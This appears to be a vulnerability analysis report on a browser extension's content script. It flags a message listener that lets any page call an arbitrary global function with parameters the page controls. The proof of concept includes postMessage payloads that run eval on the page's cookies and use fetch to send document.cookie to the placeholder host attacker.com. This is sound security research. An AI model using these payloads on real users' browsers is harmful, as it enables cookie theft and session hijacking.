# CoCo Analysis: pelahmomlhhdedjcolcbinpjimkfcpnf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 30+ (multiple eval-like flows)

---

## Sink: cs_window_eventListener_message → eval_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pelahmomlhhdedjcolcbinpjimkfcpnf/opgen_generated_files/cs_0.js
Line 469 window.addEventListener("message", function(event)
Line 497 if (event.data.method)
Line 525 window[event.data.method](event.data.params);

**Code:**

```javascript
// Content script - Entry point
window.addEventListener("message", function(event) {
    // We only accept messages from ourselves
    if (event.source != window) {
        return;
    }

    if (event.data.method) { // <- attacker-controlled
        if (event.data.type && event.data.type == 'localCall') {
            // Call function from this content script
            window[event.data.method](event.data.params); // <- eval-like arbitrary function call
        } else {
            setTimeout(function(){
                // Send message to background script
                port.postMessage({ consoleLogEnableView: consoleLog, params: null });
                port.postMessage(event.data);
            }, 1000);
        }
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// From malicious webpage where extension content script is injected
window.postMessage({
    method: "eval",  // or any window function name
    params: "alert(document.cookie)",
    type: "localCall"
}, "*");

// Alternative: call any global function with controlled params
window.postMessage({
    method: "fetch",
    params: "http://attacker.com/steal?data=" + document.cookie,
    type: "localCall"
}, "*");
```

**Impact:** Arbitrary function invocation with attacker-controlled parameters. While `window[event.data.method](event.data.params)` doesn't directly call eval(), it allows invoking any global function with attacker-controlled parameters, which is equivalent to arbitrary code execution. The attacker can invoke built-in functions like eval, Function constructor, or any exposed API with malicious parameters.
